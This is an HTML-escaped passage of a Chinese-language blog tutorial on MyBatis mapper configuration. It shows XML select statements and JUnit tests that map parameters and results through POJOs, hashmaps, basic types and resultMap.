&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('dba5637c-0b06-434a-8328-481430305a43')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_dba5637c-0b06-434a-8328-481430305a43&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_dba5637c-0b06-434a-8328-481430305a43&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('dba5637c-0b06-434a-8328-481430305a43',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_dba5637c-0b06-434a-8328-481430305a43&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;       @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testselectProductByPoJo() {
        
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectProductByPoJo&quot;&lt;span&gt;;
        Product pro &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Product();
        pro.setUnitPrice(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; BigDecimal(30&lt;span&gt;));
        pro.setIsNew(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        
        List&lt;/span&gt;&amp;lt;Product&amp;gt; listProduct =&lt;span&gt; session.selectList(statement,pro);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Product product : listProduct) {
            System.out.println(product);
        }
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;映射pojo封装对象&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; pojo包装对象 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
     &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductByVo&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.ProductVo&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      select * from products where citycode=#{product.cityCode} and isnew =#{product.isNew} 
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('ec9ef461-2184-4fcb-97ea-1bee94eadf26')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_ec9ef461-2184-4fcb-97ea-1bee94eadf26&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ec9ef461-2184-4fcb-97ea-1bee94eadf26&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('ec9ef461-2184-4fcb-97ea-1bee94eadf26',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ec9ef461-2184-4fcb-97ea-1bee94eadf26&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;       @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testselectProductByVo() {
        
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectProductByVo&quot;&lt;span&gt;;
        ProductVo vo&lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ProductVo();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;vo.setCategory(category);&lt;/span&gt;
        Product po =&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Product();
        po.setCityCode(&lt;/span&gt;&quot;A01&quot;&lt;span&gt;);
        po.setIsNew(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        vo.setProduct(po);
        
        List&lt;/span&gt;&amp;lt;Product&amp;gt; listProduct =&lt;span&gt; session.selectList(statement,vo);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Product product : listProduct) {
            System.out.println(product);
        }
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('63fec25c-34aa-4541-8d3e-1eeda0ade3fd')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_63fec25c-34aa-4541-8d3e-1eeda0ade3fd&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_63fec25c-34aa-4541-8d3e-1eeda0ade3fd&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('63fec25c-34aa-4541-8d3e-1eeda0ade3fd',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_63fec25c-34aa-4541-8d3e-1eeda0ade3fd&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ProductVo {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; category;
    
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Product product;
    
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; getCategory() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; category;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setCategory(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; category) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.category =&lt;span&gt; category;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Product getProduct() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; product;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setProduct(Product product) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.product =&lt;span&gt; product;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;映射hashmap&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;     &amp;lt;!--&lt;/span&gt;&lt;span&gt; hashmap &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
     &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductByHashMap&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;hashmap&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      select * from products where citycode=#{cityCode} and isnew =#{isNew} 
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('ac1277bc-1d3d-4ad5-b9a3-f8699d3af1aa')&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_ac1277bc-1d3d-4ad5-b9a3-f8699d3af1aa&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ac1277bc-1d3d-4ad5-b9a3-f8699d3af1aa&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('ac1277bc-1d3d-4ad5-b9a3-f8699d3af1aa',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ac1277bc-1d3d-4ad5-b9a3-f8699d3af1aa&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
&lt;pre&gt;
&lt;span&gt;       @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testselectProductByHashMap() {
        
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectProductByHashMap&quot;&lt;span&gt;;
        
        HashMap&lt;/span&gt;&amp;lt;String, Object&amp;gt; map =&lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;String, Object&amp;gt;&lt;span&gt;();
        map.put(&lt;/span&gt;&quot;cityCode&quot;, &quot;A02&quot;&lt;span&gt;);
        map.put(&lt;/span&gt;&quot;isNew&quot;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        
        List&lt;/span&gt;&amp;lt;Product&amp;gt; listProduct =&lt;span&gt; session.selectList(statement,map);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Product product : listProduct) {
            System.out.println(product);
        }
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h2&gt;Mapper 结果集映射配置&lt;/h2&gt;
&lt;p&gt;MyBatis的mapper映射文件中，resultType为输出结果集类型，同样支持基本数据类型及自定义数据类型。SQL语句查询后返回的结果集会映射到配置标签的输出映射属性对应的Java类型上。Mapper的输出映射有两种配置，分别是resultType和resultMap，注意两者不能同时使用。&lt;/p&gt;
&lt;h3&gt;映射基本数据类型&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 返回结果只有一行一列时可以使用基本数据类型 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;countProducts&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select count(1) from products 
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('6ac28bd7-c618-4bb4-8208-dc72c8c84734')&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_6ac28bd7-c618-4bb4-8208-dc72c8c84734&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_6ac28bd7-c618-4bb4-8208-dc72c8c84734&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('6ac28bd7-c618-4bb4-8208-dc72c8c84734',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_6ac28bd7-c618-4bb4-8208-dc72c8c84734&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;       @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testCountProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.countProducts&quot;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; count =&lt;span&gt; session.selectOne(statement);
        System.out.println(count);
        session.commit();&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; insert 需要commit&lt;/span&gt;
&lt;span&gt;        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;映射pojo对象&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 返回自定义类型  返回List&amp;lt;PoJo&amp;gt;，  resultType配置为PoJo类型，而不是List&lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductById&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select * from products where id = #{id}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('ed12d902-1d86-4656-9755-5acfd0529f19')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_ed12d902-1d86-4656-9755-5acfd0529f19&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ed12d902-1d86-4656-9755-5acfd0529f19&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('ed12d902-1d86-4656-9755-5acfd0529f19',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ed12d902-1d86-4656-9755-5acfd0529f19&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testSelectProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper. selectProductById &quot;&lt;span&gt;;
        Product product &lt;/span&gt;= session.selectOne(statement, 1&lt;span&gt;);
        System.out.println(product);

        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;映射pojo列表&lt;/h3&gt;
&lt;p&gt;注意：映射pojo单个对象和映射pojo列表mapper配置文件中resultType都配置为pojo类型,&lt;/p&gt;
&lt;p&gt;区别只是返回单个对象是内部调用session.selectOne返回pojo对象，返回pojo列表时内部调用session.selectList方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 返回自定义类型&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
返回单个对象，  resultType为返回对象的类型 
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;--&amp;gt;&lt;/span&gt; &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectAllProduct&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.Product&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt; select * from products &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('e5584c6e-5245-4259-b1e3-239410e20849')&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_e5584c6e-5245-4259-b1e3-239410e20849&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_e5584c6e-5245-4259-b1e3-239410e20849&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('e5584c6e-5245-4259-b1e3-239410e20849',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_e5584c6e-5245-4259-b1e3-239410e20849&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;        @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testSelectAllProduct() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectAllProduct&quot;&lt;span&gt;;
        List&lt;/span&gt;&amp;lt;Product&amp;gt; listProduct =&lt;span&gt; session.selectList(statement);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Product product : listProduct) {
            System.out.println(product);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;映射hashmap&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;     &amp;lt;!--&lt;/span&gt;&lt;span&gt; 返回hashmap &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductById2&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;int&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;hashmap&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select * from products where id = #{id}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 返回List&amp;lt;hashmap&amp;gt; &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectAllProduct2&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;hashmap&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select * from products
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('eeb0fc5a-c2e6-4338-b2e9-940915092a60')&quot; readability=&quot;36.5&quot;&gt;&lt;img id=&quot;code_img_closed_eeb0fc5a-c2e6-4338-b2e9-940915092a60&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_eeb0fc5a-c2e6-4338-b2e9-940915092a60&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('eeb0fc5a-c2e6-4338-b2e9-940915092a60',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_eeb0fc5a-c2e6-4338-b2e9-940915092a60&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
&lt;span&gt;     @Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testSelectProductById() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectProductById2&quot;&lt;span&gt;;
        HashMap&lt;/span&gt;&amp;lt;String, Object&amp;gt; map = session.selectOne(statement, 1&lt;span&gt;);

        Iterator&lt;/span&gt;&amp;lt;Map.Entry&amp;lt;String, Object&amp;gt;&amp;gt; it =&lt;span&gt; map.entrySet().iterator();
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (it.hasNext()) {
            Map.Entry&lt;/span&gt;&amp;lt;String, Object&amp;gt; entry =&lt;span&gt; it.next();
            System.out.println(&lt;/span&gt;&quot;key= &quot; + entry.getKey() + &quot; and value= &quot; +&lt;span&gt; entry.getValue());
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;        session.close();
    }

@Test
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testSelectProducts2() {
            String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectAllProduct2&quot;&lt;span&gt;;
            
            List&lt;/span&gt;&amp;lt;HashMap&amp;lt;String, Object&amp;gt;&amp;gt; list =&lt;span&gt; session.selectList(statement);

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (HashMap&amp;lt;String, Object&amp;gt;&lt;span&gt; map : list) {
                Iterator&lt;/span&gt;&amp;lt;Map.Entry&amp;lt;String, Object&amp;gt;&amp;gt; it =&lt;span&gt; map.entrySet().iterator();
                &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (it.hasNext()) {
                    Map.Entry&lt;/span&gt;&amp;lt;String, Object&amp;gt; entry =&lt;span&gt; it.next();
                    System.out.println(&lt;/span&gt;&quot;key= &quot; + entry.getKey() + &quot; and value= &quot; +&lt;span&gt; entry.getValue());
                }
            }
            
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关闭会话&lt;/span&gt;
&lt;span&gt;            session.close();
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;使用resultMap映射结果集&lt;/h3&gt;
&lt;p&gt;使用resultType可以映射结果集时需要pojo的属性名和sql查询结果的列名一致才可以映射成功。如果sql查询结果集字段名和pojo的属性名不一致，则需要通过resultMap将字段名和属性名作一个对应关系（sql 查询取别名与pojo属性一致也可以） ，resultMap实质上还需要将查询结果映射到pojo对象中。resultMap可以实现将查询结果映射为复杂类型的pojo，比如在查询结果映射对象中包括pojo和list实现一对一查询和一对多查询。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    &amp;lt;!--&lt;/span&gt;&lt;span&gt; 使用resultMap映射结果集   &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectProductInfo&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;productInfoResultMap&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select p.`Name` pName,p.Description,c.citycode,c.`name` cName 
        from products  p
        join city c
        on p.citycode = c.citycode
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;productInfoResultMap&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.sl.po.ProductInfo&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;ProductName&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;pName&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;=&quot;CityName&quot;&lt;/span&gt;&lt;span&gt; column&lt;/span&gt;&lt;span&gt;=&quot;cName&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('3782b2c1-2739-475c-9c3a-9a8c13b93e15')&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_3782b2c1-2739-475c-9c3a-9a8c13b93e15&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_3782b2c1-2739-475c-9c3a-9a8c13b93e15&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('3782b2c1-2739-475c-9c3a-9a8c13b93e15',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_3782b2c1-2739-475c-9c3a-9a8c13b93e15&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Test
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; testselectProductInfo() {
        String statement &lt;/span&gt;= &quot;com.sl.mapper.ProductMapper.selectProductInfo&quot;&lt;span&gt;;

        List&lt;/span&gt;&amp;lt;ProductInfo&amp;gt; list =&lt;span&gt; session.selectList(statement);
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (ProductInfo info : list) {
            System.out.println(info);
        }
        session.close();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
